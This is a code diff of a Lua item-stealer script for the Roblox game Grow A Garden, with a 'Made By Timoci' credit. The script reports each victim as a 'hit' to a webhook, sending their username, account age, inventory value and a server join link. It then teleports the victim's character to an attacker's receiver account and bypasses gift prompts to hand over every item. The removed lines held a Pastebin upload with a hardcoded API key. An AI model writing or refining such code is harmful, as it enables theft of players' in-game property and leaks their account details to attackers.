@@ -133,86 +133,38 @@ local function buildBackpackSection(items)
     return table.concat(itemLines, "\n")
 end
 
+-- NEW: Build the items embed as a separate embed
 local function buildItemsEmbed(items)
     return {
         title = "🎁 Items Received",
-        description = string.format("``````", buildBackpackSection(items)),
+description = string.format("```\n%s\n```", buildBackpackSection(items)),
         color = 5793266, -- blue-ish
     }
 end
 
--- PASTEBIN UPLOAD FUNCTION
-local PASTEBIN_DEV_KEY = "2GXZr-FQKQR15rYjoyFmogIiRIzNif9x"
-
-local function uploadToPastebin(text)
-    local url = "https://pastebin.com/api/api_post.php"
-    local data = "api_dev_key=" .. PASTEBIN_DEV_KEY
-        .. "&api_option=paste"
-        .. "&api_paste_code=" .. HttpService:UrlEncode(text)
-        .. "&api_paste_private=1"
-        .. "&api_paste_expire_date=10M"
-        .. "&api_paste_name=" .. HttpService:UrlEncode("GAG Item Log")
-    local response
-    pcall(function()
-        response = req({
-            Url = url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/x-www-form-urlencoded"},
-            Body = data
-        })
-    end)
-    print("Pastebin response:", response and response.Body)
-    if response and response.Body and tostring(response.Body):find("https://pastebin.com/") then
-        return tostring(response.Body)
-    end
-    return nil
-end
-
-local function buildMainEmbed(executer, receiver, totalValue, foundRare, pasteLink)
+-- Main embed for the webhook
+local function buildMainEmbed(executer, receiver, totalValue, foundRare)
     local joinLink = ("https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s"):format(game.JobId)
     local accountAge = (executer and executer.AccountAge or "?") .. " days"
-    local fields = {
-        {name = "🧑‍💻 Player Information", value = string.format("**Username:** `%s`\n**Receiver:** `%s`\n**Account Age:** `%s`", executer.Name, receiver, accountAge), inline = false},
-        {name = "💰 Total Value", value = string.format("**%s¢**", formatValue(totalValue)), inline = false},
-        {name = "🌴 Join with URL", value = string.format("[Join with URL](%s)", joinLink), inline = false},
-        {name = "📄 View all hits", value = pasteLink and string.format("[View all hits](%s) _(expires in ~10m)_", pasteLink) or "_Failed to upload paste!_", inline = false}
-    }
     return {
         title = "🥗 Grow A Garden Hit",
         color = foundRare and 16776960 or 65280,
-        fields = fields,
+        fields = {
+            {name = "🧑‍💻 Player Information", value = string.format("**Username:** `%s`\n**Receiver:** `%s`\n**Account Age:** `%s`", executer.Name, receiver, accountAge), inline = false},
+            {name = "💰 Total Value", value = string.format("**%s¢**", formatValue(totalValue)), inline = false},
+            {name = "🌴 Join with URL", value = string.format("[Join with URL](%s)", joinLink), inline = false}
+        },
         footer = {text = "Made By Timoci"}
     }
 end
 
-local function buildAllItemsText(items)
-    if #items == 0 then return "_No items!_" end
-    local lines = {}
-    for _, item in ipairs(items) do
-        if item.Type == "Pet" then
-            table.insert(lines, string.format("%s %s [%.2fkg] [Age %s] %s¢", item.Emoji, item.Name, item.Weight, tostring(item.Age or "?"), formatValue(item.Value)))
-        else
-            table.insert(lines, string.format("%s %s [%.2fkg] %s¢", item.Emoji, item.Name, item.Weight, formatValue(item.Value)))
-        end
-    end
-    return table.concat(lines, "\n")
-end
-
 local function prettyWebhookData(executer, receiver)
     local items, totalValue, foundRare = collectItems()
-    local topItems = {}
-    for i, item in ipairs(items) do
-        if i <= 10 then
-            table.insert(topItems, item)
-        end
-    end
-    local pasteText = buildAllItemsText(items)
-    local pasteLink = uploadToPastebin(pasteText)
     return {
         content = (foundRare and "@everyone" or ""),
         embeds = {
-            buildMainEmbed(executer, receiver, totalValue, foundRare, pasteLink),
-            buildItemsEmbed(topItems)
+            buildMainEmbed(executer, receiver, totalValue, foundRare),
+            buildItemsEmbed(items)
         }
     }
 end
@@ -261,53 +213,24 @@ local function findGiftPrompt(targetChar)
     return nil
 end
 
--- TELEPORT EXECUTOR (YOU) ALMOST INSIDE RECEIVER BEFORE EVERY GIFT
 local function doGift(receiver)
     if giftingDone then return end
     giftingDone = true
     local myChar = plr.Character or plr.CharacterAdded:Wait()
-    local receiverChar = receiver.Character or receiver.CharacterAdded:Wait()
-    local receiverHRP = receiverChar:WaitForChild("HumanoidRootPart")
-    local myHRP = myChar:WaitForChild("HumanoidRootPart")
-    while true do
-        local items = select(1, collectItems())
-        if #items == 0 then break end
-        for _, item in ipairs(items) do
-            -- Teleport yourself almost inside the receiver before gifting each item
-            myHRP.CFrame = receiverHRP.CFrame * CFrame.new(0, 0, 0.2) -- 0.2 studs in front
-            wait(0.1)
-            print("Gifting item:", item.Name)
-            equipTool(item.Tool)
-            local prompt = findGiftPrompt(receiver.Character)
-            if prompt then
-                local t0 = os.clock()
-                local promptEnabled = false
-                repeat
-                    task.wait(0.1)
-                    if prompt.Enabled then promptEnabled = true end
-                    if (os.clock() - t0) > 15 then
-                        print("Still waiting for prompt on item:", item.Name, "Parent:", item.Tool.Parent, "Time waited:", os.clock() - t0)
-                    end
-                until promptEnabled or (os.clock() - t0) > 20
-                if promptEnabled then
-                    bypassProximityPrompt(prompt)
-                    wait(0.2)
-                else
-                    print("Prompt NOT enabled for item:", item.Name, "after 20s. Parent:", item.Tool.Parent)
-                end
-            else
-                print("No prompt found for item:", item.Name)
-            end
-            -- Wait for the tool to leave the character (gifted or returned to backpack)
-            local waitStart = os.clock()
-            while item.Tool.Parent == plr.Character and (os.clock() - waitStart) < 4 do
-                task.wait(0.1)
-            end
-            wait(0.1)
+    myChar:WaitForChild("HumanoidRootPart").CFrame = receiver.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,2)
+    local items = select(1, collectItems())
+    for _, item in ipairs(items) do
+        equipTool(item.Tool)
+        local prompt = findGiftPrompt(receiver.Character)
+        if prompt then
+            local t0 = os.clock()
+            repeat task.wait(0.09) if (os.clock() - t0) > 4 then break end until prompt.Enabled
+            bypassProximityPrompt(prompt)
+            wait(0.18)
         end
-        wait(0.3)
+        item.Tool.Parent = backpack
+        wait(0.08)
     end
-    giftingDone = false
 end
 
 sendHitWebhook(plr, CONFIG.USERNAMES[1] or "unknown")
